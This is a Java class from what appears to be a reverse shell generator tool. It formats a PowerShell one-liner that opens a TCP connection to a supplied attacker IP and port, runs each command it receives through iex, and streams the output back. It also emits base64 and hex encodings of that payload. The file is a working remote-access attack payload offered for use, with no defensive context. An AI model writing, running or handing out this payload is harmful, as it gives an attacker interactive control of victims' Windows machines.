    package com.iteso.ReverseShellGenerator.Reverse.Shells;
    import com.iteso.ReverseShellGenerator.DEncoder;
    import com.iteso.ReverseShellGenerator.Reverse.Reverse;

    public class Powershell_2 extends Reverse {

        protected String shellFormat = "";

        public Powershell_2(String localIP, int localPort, LISTENER listener, SHELLS shellType){
            super(localIP, localPort, listener, shellType);
            shellFormat = String.format("powershell -nop -c \\\"$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\\\"",this.getLocalIP() ,this.getLocalPort() );
        }

        @Override
        public String getShellCode(){
            return shellFormat;
        }

        @Override
        public String toString(){
            return "{" + "\"parameters\": " + super.toString() + "," +
                        "\"reverse_listener_code\": " + "\"" + super.getListenerCode() + "\"," +
                        "\"reverse_shell_code\": " + "\"" + getShellCode() + "\"," +
                        "\"reverse_shell_code_b64\": " + "\"" + DEncoder.encodeToBase64(getShellCode()) + "\"," +
                        "\"reverse_shell_code_hex\": " + "\"" + DEncoder.encodeToHex(getShellCode()) + "\"" +
                    "}";
        }
    
}